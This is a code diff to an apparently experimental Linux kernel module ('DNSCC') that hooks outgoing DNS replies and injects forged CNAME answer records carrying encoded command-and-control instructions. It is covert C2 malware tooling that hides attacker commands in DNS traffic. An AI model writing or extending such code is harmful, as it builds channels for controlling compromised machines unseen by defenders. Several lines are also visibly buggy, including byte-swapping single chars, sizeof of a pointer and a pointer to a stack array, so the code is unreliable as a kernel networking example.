@@ -244,12 +244,12 @@ unsigned char* read_dns_name(unsigned char* reader, unsigned char* buffer, int* 
 
 }
 
-void manipulate_dns_reply(unsigned char* data, unsigned char cname_string, unsigned char* new_dns_data ){
+void manipulate_dns_reply(unsigned char* data, unsigned char* command, unsigned char* new_dns_data, uint16_t* new_dns_size ){
 	struct DNS_HEADER *dns_h,*ndns_h;
 	unsigned char *qname, *nqname;
 	unsigned char* dns_name;
 	unsigned char *dpointer;
-        struct RR ar[10],aur[10],adr[10];
+        struct RR ar[10],*new_ar;
 	int temp;  // domain name reader temp var
 	int dnsn_count;//question dns name count
 	int i,j;
@@ -272,7 +272,7 @@ void manipulate_dns_reply(unsigned char* data, unsigned char cname_string, unsig
 		dpointer = dpointer + sizeof(struct RR_DATA);
 		//parse rdata
 		//ipv4 or name
-		printk(KERN_INFO "%d %d",ntohs(ar[i].rr_data->type),ntohs(ar[i].rr_data->rdlength));
+		printk(KERN_INFO "%d %d %d %d",ntohs(ar[i].rr_data->type),ntohs(ar[i].rr_data->rdlength),ntohs(ar[i].rr_data->class),ntohs(ar[i].rr_data->ttl));
 		if(ntohs(ar[i].rr_data->type) == 1) //ipv4
 		{
 			ar[i].rdata = (unsigned char)kmalloc(ntohs(ar[i].rr_data->rdlength),GFP_DMA);
@@ -296,12 +296,31 @@ void manipulate_dns_reply(unsigned char* data, unsigned char cname_string, unsig
 
 
 	}
+	/* Create fake answer rr record */
+	unsigned char orig_ans[5] = "asd55";
+	struct RR fake_rr;
+	int com_len = strlen(command)+1;
+	fake_rr.name = kmalloc(sizeof(unsigned char)*2,GFP_DMA);
+	fake_rr.name[0] = htons(0x0c);
+	fake_rr.name[1] = htons(0xc0);
+	//memcpy(fake_rr.name,&command,sizeof(unsigned char)*2);
+	printk(KERN_INFO"fake comm %x - %x",ntohs(fake_rr.name[0]),ntohs(fake_rr.name[1]));
+	fake_rr.rr_data = kmalloc(sizeof(struct RR_DATA),GFP_DMA);
+	fake_rr.rr_data->type = htons(5);//cname
+	fake_rr.rr_data->class = htons(1);
+	fake_rr.rr_data->ttl = htons(0);
+	fake_rr.rr_data->rdlength = htons(5);
+	fake_rr.rdata = kmalloc(sizeof(unsigned char)*sizeof(orig_ans),GFP_DMA);
+	fake_rr.rdata = orig_ans;
 	/* put together the new dns packet */
+	unsigned int new_ar_size = sizeof(unsigned char)*sizeof(command)+sizeof(struct RR_DATA)+sizeof(unsigned char)*sizeof(orig_ans);
 	ndns_h = (struct DNS_HEADER *)new_dns_data;
 	*ndns_h = *dns_h;								// use the old header
+	ndns_h->ancount = htons(1);
 	nqname = (unsigned char *)&new_dns_data[sizeof(struct DNS_HEADER)];
 	memcpy(nqname,qname,strlen((const char*)qname)+1+sizeof(struct QUESTION));	//use the original qname + question flags
-											//first answer here, so inject our fake cname
+	new_ar = (struct RR *)&new_dns_data[sizeof(struct DNS_HEADER)+strlen((const char*)qname)+1+sizeof(struct QUESTION)];
+	memcpy(new_ar,&fake_rr,new_ar_size);//first answer here, so inject our fake cname
 	
 }
 
@@ -402,12 +421,12 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 	//	if(check_command_exists(iph->daddr) == 1){
 			printk(KERN_INFO "[DNSCC] C&C command found for %pI4 replacing original DNS reply",&iph->daddr);
 			/* Manipulate the answer */
-			unsigned char new_cname="valami.com.";
+			unsigned char *command="3get5valam0";
 			unsigned char *orig_dns_data;
 			unsigned char *new_dns_data;
 			uint16_t new_dns_size;
 			uint16_t payload_len = ntohs(udph->len) - UDP_HDR_LEN;
-			new_dns_size = sizeof(unsigned char)*payload_len + sizeof(new_cname);
+			new_dns_size = sizeof(unsigned char)*payload_len + sizeof(command);
 			new_dns_data = kmalloc(new_dns_size,GFP_DMA);
 			orig_dns_data = kmalloc(sizeof(unsigned char)*payload_len,GFP_DMA);
 			skb_copy_bits(skb,skb->len - payload_len,orig_dns_data,payload_len); // copy data from skb
@@ -418,7 +437,7 @@ static unsigned int dnscc_send(unsigned int hooknum, struct sk_buff* skb, const 
 			//memcpy(orig_dns_data,skb->data,skb->data_len);
 			//skb_trim(skb,skb->len - skb->data_len); //remove the original dns payload
 			printk(KERN_INFO "SKB DATA LEN %d",payload_len);
-			manipulate_dns_reply(orig_dns_data,new_cname,new_dns_data);
+			manipulate_dns_reply(orig_dns_data,command,new_dns_data,&new_dns_size);
 			memcpy(data,new_dns_data,new_dns_size);
 			skb->len = skb->len - (payload_len) + new_dns_size;
 //			data = skb_put(skb_new,sizeof(new_dns_data));
